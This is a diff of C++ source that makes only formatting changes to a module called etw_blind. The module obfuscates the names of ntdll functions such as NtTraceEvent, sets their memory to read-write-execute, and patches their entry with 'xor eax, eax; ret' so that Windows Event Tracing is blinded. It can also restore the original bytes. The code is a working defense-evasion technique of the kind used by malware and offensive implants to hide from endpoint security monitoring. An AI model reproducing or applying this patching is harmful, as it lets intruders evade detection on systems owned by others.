@@ -26,7 +26,7 @@ static PatchSlot s_slots[kMaxTargets];
 static int s_slot_count = 0;
 static bool s_active = false;
 
-// xor eax, eax; ret  — returns 0 (STATUS_SUCCESS / FALSE-ish)
+// xor eax, eax; ret, returns 0 (STATUS_SUCCESS / FALSE-ish)
 static const std::uint8_t kBlindPatch[] = {0x33, 0xC0, 0xC3};
 
 bool protect_rwx(void* addr, std::size_t len, DWORD* old_out) {
@@ -45,7 +45,7 @@ bool protect_rwx(void* addr, std::size_t len, DWORD* old_out) {
     }
   }
   DWORD old = 0;
-  if (!::VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return false;
+  if (! ::VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return false;
   *old_out = old;
   return true;
 }
@@ -60,7 +60,7 @@ bool protect_restore(void* addr, std::size_t len, DWORD old_prot) {
     if (api.NtProtectVirtualMemory(self, &base, &region, old_prot, &tmp) >= 0) return true;
   }
   DWORD tmp = 0;
-  return ::VirtualProtect(addr, len, old_prot, &tmp) != FALSE;
+  return::VirtualProtect(addr, len, old_prot, &tmp) != FALSE;
 }
 
 void* resolve_ntdll(const char* name) {
@@ -80,7 +80,7 @@ bool patch_one(const char* name, PatchSlot& slot) {
   if (!protect_rwx(addr, slot.patch_len, &old)) return false;
   std::memcpy(addr, kBlindPatch, slot.patch_len);
   protect_restore(addr, slot.patch_len, old);
-  ::FlushInstructionCache(::GetCurrentProcess(), addr, slot.patch_len);
+::FlushInstructionCache(::GetCurrentProcess(), addr, slot.patch_len);
   slot.active = true;
   return true;
 }
@@ -91,7 +91,7 @@ bool restore_one(PatchSlot& slot) {
   if (!protect_rwx(slot.address, slot.patch_len, &old)) return false;
   std::memcpy(slot.address, slot.saved, slot.patch_len);
   protect_restore(slot.address, slot.patch_len, old);
-  ::FlushInstructionCache(::GetCurrentProcess(), slot.address, slot.patch_len);
+::FlushInstructionCache(::GetCurrentProcess(), slot.address, slot.patch_len);
   slot.active = false;
   return true;
 }
@@ -119,7 +119,7 @@ EtwBlindReport etw_blind_apply() noexcept {
       OBF("NtTraceEvent"),
   };
 
-  for (const char* t : targets) {
+  for (const char* t: targets) {
     if (s_slot_count >= kMaxTargets) break;
     ++rep.targets_found;
     if (patch_one(t, s_slots[s_slot_count])) {
@@ -130,7 +130,7 @@ EtwBlindReport etw_blind_apply() noexcept {
 
   s_active = rep.targets_patched > 0;
   rep.patched = s_active;
-  rep.detail = s_active ? "patched" : "no targets resolved";
+  rep.detail = s_active ? "patched": "no targets resolved";
   return rep;
 }
 
